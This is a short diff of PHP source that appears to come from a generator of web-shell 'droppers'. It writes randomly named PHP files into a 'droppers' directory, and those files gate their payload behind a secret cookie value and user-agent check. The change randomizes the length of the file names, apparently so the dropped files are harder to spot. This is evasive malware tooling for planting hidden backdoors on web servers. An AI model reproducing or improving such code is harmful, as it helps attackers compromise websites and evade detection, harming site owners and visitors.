@@ -3,7 +3,6 @@ const alpha = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
 const special  = '~!@#%^&*(){}[],./?';
 const disallowed = '1234567890';
 const allowed_chars = alpha;
-const all_chars = alpha.special.disallowed;
 
 class dynamic_generator
 {
@@ -34,7 +33,7 @@ if (\$_COOKIE['$cookieName'] === '$cookie_value' && \$_SERVER['HTTP_USER_AGENT']
     die();
 }
 SLIMM;
-                $push_out = 'includes/droppers/dynamic/slim/'.bin2hex(openssl_random_pseudo_bytes(15)).'.php';
+                $push_out = 'includes/droppers/dynamic/slim/'.bin2hex(openssl_random_pseudo_bytes(rand(4,15))).'.php';
                 $to_out = fopen($push_out, 'a+');
                 fwrite($to_out, (string)$slim[0]);
                 fwrite($to_out, $dr);
